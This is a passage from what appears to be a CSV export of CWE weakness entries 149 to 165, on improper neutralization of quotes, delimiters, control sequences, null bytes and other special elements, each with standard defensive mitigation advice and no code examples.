checked."
CWE-149: Improper Neutralization of Quoting Syntax,"Quotes injected into a product can be used to compromise a system. As data are parsed, an injected/absent/duplicate/malformed use of quotes may cause the process to take unexpected actions.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that quotes will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
"CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences","The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that escape, meta and control characters/sequences will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-151: Improper Neutralization of Comment Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as comment delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that comments will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-152: Improper Neutralization of Macro Symbols,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as macro symbols when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Phase:  ImplementationStrategy:  Input ValidationDevelopers should anticipate that macro symbols will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingUse and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-153: Improper Neutralization of Substitution Characters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as substitution characters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that substitution characters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-154: Improper Neutralization of Variable Name Delimiters,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as variable name delimiters when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that variable name delimiters will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-155: Improper Neutralization of Wildcards or Matching Symbols,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as wildcards or matching symbols when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that wildcard or matching elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-156: Improper Neutralization of Whitespace,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as whitespace when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that whitespace will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-157: Failure to Sanitize Paired Delimiters,"The product does not properly handle the characters that are used to mark the beginning and ending of a group of entities, such as parentheses, brackets, and braces.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that grouping elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-158: Improper Neutralization of Null Byte or NUL Character,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes NUL characters or null bytes when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that null characters or null bytes will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-159: Improper Handling of Invalid Use of Special Elements,"The product does not properly filter, remove, quote, or otherwise manage the invalid use of special elements in user-controlled input, which could cause adverse effect on its behavior and integrity.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that special elements will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-160: Improper Neutralization of Leading Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that leading special elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-161: Improper Neutralization of Multiple Leading Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple leading special elements that could be interpreted in unexpected ways when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that multiple leading special elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-162: Improper Neutralization of Trailing Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that trailing special elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-163: Improper Neutralization of Multiple Trailing Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that multiple trailing special elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-164: Improper Neutralization of Internal Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that internal special elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
CWE-165: Improper Neutralization of Multiple Internal Special Elements,"The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes multiple internal special elements that could be interpreted in unexpected ways when they are sent to a downstream component.","Scope: Integrity, Impact: Technical Impact:Unexpected State, Likelihood: ",无示范例子,"Developers should anticipate that multiple internal special elements will be injected/removed/manipulated in the input vectors of their product. Use an appropriate combination of denylists and allowlists to ensure only valid, expected and appropriate input is processed by the system.Phase:  ImplementationStrategy:  Input ValidationAssume all input is malicious. Use an ""accept known good"" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, ""boat"" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as ""red"" or ""blue.""Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.Phase:  ImplementationStrategy:  Output EncodingWhile it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).Phase:  ImplementationStrategy:  Input ValidationInputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."
